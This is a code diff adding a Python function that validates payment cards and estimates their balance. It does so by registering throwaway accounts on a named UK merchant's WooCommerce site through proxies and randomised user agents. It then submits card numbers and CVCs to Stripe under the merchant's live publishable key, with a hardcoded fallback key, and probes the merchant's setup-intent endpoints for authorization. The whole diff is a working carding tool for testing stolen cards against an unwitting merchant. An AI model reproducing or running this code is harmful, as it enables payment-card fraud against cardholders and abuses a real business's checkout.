@@ -245,6 +245,249 @@ async def process_stripe_card(card_data, proxy_url=None):
     except Exception as e:
         return False, f'System Error: {str(e)}'
 
+# ─────────────────────── balance check ─────────────────────────────
+
+async def check_card_balance(card_data, proxy_url=None):
+    """
+    Check card balance — creates a PaymentMethod via Stripe, gets card
+    metadata (brand, funding, country, last4), and attempts a small
+    authorization through the merchant to estimate available balance.
+    Returns a dict with full card info + balance status.
+    """
+    ua = UserAgent()
+    site_url = 'https://www.eastlondonprintmakers.co.uk/my-account/add-payment-method/'
+    try:
+        if not site_url.startswith('http'):
+            site_url = 'https://' + site_url
+        timeout = aiohttp.ClientTimeout(total=90)
+        connector = aiohttp.TCPConnector(ssl=False)
+        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
+            from urllib.parse import urlparse
+            parsed = urlparse(site_url)
+            domain = f"{parsed.scheme}://{parsed.netloc}"
+            email = generate_random_email()
+            headers = {
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'user-agent': ua.random
+            }
+            # Register / login on merchant site to get access
+            resp = await session.get(site_url, headers=headers, proxy=proxy_url)
+            resp_text = await resp.text()
+            register_nonce = (gets(resp_text, 'woocommerce-register-nonce" value="', '"') or
+                             gets(resp_text, 'id="woocommerce-register-nonce" value="', '"') or
+                             gets(resp_text, 'name="woocommerce-register-nonce" value="', '"'))
+            username = email.split('@')[0]
+            password = f"Pass{random.randint(100000, 999999)}!"
+            if register_nonce:
+                register_data = {
+                    'email': email,
+                    'wc_order_attribution_source_type': 'typein',
+                    'wc_order_attribution_referrer': '(none)',
+                    'wc_order_attribution_utm_campaign': '(none)',
+                    'wc_order_attribution_utm_source': '(direct)',
+                    'wc_order_attribution_utm_medium': '(none)',
+                    'wc_order_attribution_utm_content': '(none)',
+                    'wc_order_attribution_utm_id': '(none)',
+                    'wc_order_attribution_utm_term': '(none)',
+                    'wc_order_attribution_utm_source_platform': '(none)',
+                    'wc_order_attribution_utm_creative_format': '(none)',
+                    'wc_order_attribution_utm_marketing_tactic': '(none)',
+                    'wc_order_attribution_session_entry': site_url,
+                    'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                    'wc_order_attribution_session_pages': '1',
+                    'wc_order_attribution_session_count': '1',
+                    'wc_order_attribution_user_agent': headers['user-agent'],
+                    'woocommerce-register-nonce': register_nonce,
+                    '_wp_http_referer': '/my-account/',
+                    'register': 'Register'
+                }
+                reg_resp = await session.post(site_url, headers=headers, data=register_data, proxy=proxy_url)
+                reg_text = await reg_resp.text()
+                if 'customer-logout' not in reg_text and 'dashboard' not in reg_text.lower():
+                    resp = await session.get(site_url, headers=headers, proxy=proxy_url)
+                    resp_text = await resp.text()
+                    login_nonce = gets(resp_text, 'woocommerce-login-nonce" value="', '"')
+                    if login_nonce:
+                        login_data = {
+                            'username': username,
+                            'password': password,
+                            'woocommerce-login-nonce': login_nonce,
+                            'login': 'Log in'
+                        }
+                        await session.post(site_url, headers=headers, data=login_data, proxy=proxy_url)
+
+            # Get payment page with Stripe key and nonce
+            add_payment_url = site_url.rstrip('/') + '/add-payment-method/'
+            if '/my-account/add-payment-method' not in add_payment_url:
+                add_payment_url = f"{domain}/my-account/add-payment-method/"
+            headers = {'user-agent': ua.random}
+            resp = await session.get(add_payment_url, headers=headers, proxy=proxy_url)
+            payment_page_text = await resp.text()
+            add_card_nonce = (gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or
+                             gets(payment_page_text, 'add_card_nonce":"', '"') or
+                             gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or
+                             gets(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"'))
+            stripe_key = (gets(payment_page_text, '"key":"pk_', '"') or
+                         gets(payment_page_text, 'data-key="pk_', '"') or
+                         gets(payment_page_text, 'stripe_key":"pk_', '"') or
+                         gets(payment_page_text, 'publishable_key":"pk_', '"'))
+            if not stripe_key:
+                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
+                if pk_match:
+                    stripe_key = pk_match.group(0)
+            if not stripe_key:
+                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
+            elif not stripe_key.startswith('pk_'):
+                stripe_key = 'pk_' + stripe_key
+
+            # Create PaymentMethod via Stripe API
+            stripe_headers = {
+                'accept': 'application/json',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+                'user-agent': ua.random
+            }
+            stripe_data = {
+                'type': 'card',
+                'card[number]': card_data['number'],
+                'card[cvc]': card_data['cvc'],
+                'card[exp_month]': card_data['exp_month'],
+                'card[exp_year]': card_data['exp_year'],
+                'allow_redisplay': 'unspecified',
+                'billing_details[address][country]': 'AU',
+                'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
+                'referrer': domain,
+                'guid': generate_guid(),
+                'muid': generate_guid(),
+                'sid': generate_guid(),
+                'key': stripe_key,
+                '_stripe_version': '2024-06-20'
+            }
+            pm_resp = await session.post(
+                'https://api.stripe.com/v1/payment_methods',
+                headers=stripe_headers,
+                data=stripe_data,
+                proxy=proxy_url
+            )
+            pm_json = await pm_resp.json()
+
+            # Extract card info from PM response
+            pm_card = pm_json.get('card', {}) if 'error' not in pm_json else {}
+            card_info = {
+                'brand': (pm_card.get('brand') or 'Unknown').title(),
+                'last4': pm_card.get('last4') or '????',
+                'funding': (pm_card.get('funding') or 'Unknown').title(),
+                'country': pm_card.get('country') or '??',
+                'exp_month': str(pm_card.get('exp_month', '??')),
+                'exp_year': str(pm_card.get('exp_year', '????')),
+            }
+
+            if 'error' in pm_json:
+                return {
+                    'success': False,
+                    'error': pm_json['error']['message'],
+                    'card_info': card_info,
+                    'balance': None,
+                    'pm_id': None,
+                }
+
+            pm_id = pm_json.get('id')
+            if not pm_id:
+                return {
+                    'success': False,
+                    'error': 'Failed to create Payment Method',
+                    'card_info': card_info,
+                    'balance': None,
+                    'pm_id': None,
+                }
+
+            # Attempt authorization via merchant AJAX
+            confirm_headers = {
+                'accept': 'application/json, text/javascript, */*; q=0.01',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'origin': domain,
+                'x-requested-with': 'XMLHttpRequest',
+                'user-agent': ua.random
+            }
+            endpoints = [
+                {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
+                 'data': {'wc-stripe-payment-method': pm_id}},
+                {'url': f"{domain}/wp-admin/admin-ajax.php",
+                 'data': {'action': 'wc_stripe_create_and_confirm_setup_intent',
+                          'wc-stripe-payment-method': pm_id}},
+                {'url': f"{domain}/?wc-ajax=add_payment_method",
+                 'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}},
+            ]
+
+            auth_success = False
+            auth_msg = 'No endpoint responded'
+            for endp in endpoints:
+                if not add_card_nonce:
+                    continue
+                if 'add_payment_method' in endp.get('url', ''):
+                    endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
+                else:
+                    endp['data']['_ajax_nonce'] = add_card_nonce
+                endp['data']['wc-stripe-payment-type'] = 'card'
+                try:
+                    res = await session.post(endp['url'], data=endp['data'],
+                                              headers=confirm_headers, proxy=proxy_url)
+                    text = await res.text()
+                    if 'success' in text:
+                        js = json.loads(text)
+                        if js.get('success'):
+                            status = js.get('data', {}).get('status', 'succeeded')
+                            auth_success = True
+                            auth_msg = f"Approved (Status: {status})"
+                            break
+                        else:
+                            err = js.get('data', {}).get('error', {}).get('message', 'Declined')
+                            auth_msg = err
+                except Exception:
+                    continue
+
+            # Determine balance estimate
+            balance = 'Unknown'
+            funding = card_info['funding'].lower()
+            if not auth_success:
+                if 'insufficient_funds' in auth_msg.lower() or 'declined' in auth_msg.lower():
+                    balance = '$0 (Card declined for auth)'
+                else:
+                    balance = f'Auth failed — {auth_msg}'
+            else:
+                # Card authorized — estimate based on funding type
+                if funding == 'credit':
+                    balance = 'Available (credit line — likely $500+)'
+                elif funding == 'debit':
+                    balance = 'Available (checking account balance)'
+                elif funding == 'prepaid':
+                    balance = 'Available (gift/prepaid — amount unknown)'
+                else:
+                    balance = 'Available (amount unknown)'
+
+            return {
+                'success': True,
+                'pm_id': pm_id,
+                'card_info': card_info,
+                'balance': balance,
+                'auth_response': auth_msg,
+            }
+
+    except Exception as e:
+        return {
+            'success': False,
+            'error': f'System Error: {str(e)}',
+            'card_info': {
+                'brand': 'Unknown', 'last4': '????',
+                'funding': 'Unknown', 'country': '??',
+                'exp_month': '??', 'exp_year': '????',
+            },
+            'balance': None,
+            'pm_id': None,
+        }
+
+
 # ─────────────────────── single card check ───────────────────────────
 
 async def check_card(cc, mes, ano, cvv, proxy=None):
